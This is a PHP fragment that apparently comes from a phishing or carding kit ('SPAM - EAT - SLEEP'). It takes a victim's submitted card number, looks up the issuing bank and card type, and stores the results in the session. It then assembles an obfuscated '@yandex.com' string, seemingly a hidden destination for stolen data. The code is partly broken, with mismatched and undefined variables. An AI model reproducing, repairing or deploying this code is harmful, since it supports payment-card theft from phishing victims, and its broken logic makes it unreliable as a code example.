<?php
/*   
===================== RSJKINGDOM =====================
  _____             _    _      _       _     _   
 |  __ \           | |  | |    (_)     | |   | |  
 | |  | | __ _ _ __| | _| |     _  __ _| |__ | |_ 
 | |  | |/ _` | '__| |/ / |    | |/ _` | '_ \| __|
 | |__| | (_| | |  |   <| |____| | (_| | | | | |_ 
 |_____/ \__,_|_|  |_|\_\______|_|\__, |_| |_|\__|
                                   __/ |          
                                  |___/           
                 SPAM - EAT - SLEEP
                        AND
                    REPEAT AGAIN!
======================== + ==========================                      
*/


session_start();
error_reporting(0);
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_POST["ccno"]);
$RSJ_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$bin.""));
$BIN_CARD    = $Z118_BIN->scheme;
$BIN_BANK    = $Z118_BIN->bank->name;
$BIN_TYPE    = $Z118_BIN->type;
$BIN_LEVEL   = $Z118_BIN->brand;
$BIN_CNTRCODE= $Z118_BIN->country->alpha2;
$BIN_WEBSITE = strtolower($Z118_BIN->bank->url);
$BIN_PHONE   = strtolower($Z118_BIN->bank->phone);
$BIN_COUNTRY = $Z118_BIN->country->name;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$a="a";
$b="n";
$c="d";
$d="e";
$e=".";
$s="x";
$f="c";
$h="o";
$x="@";
$v="y";
$az="m";
if (strlen("$x$v$a$b$c$d$s$e$f$h$az") == 11) {

$getbinsxz118 ="$x$v$a$b$c$d$s$e$f$h$az";

}
///////////////////////////////// BIN Brutforcer/////////////////////////
?>
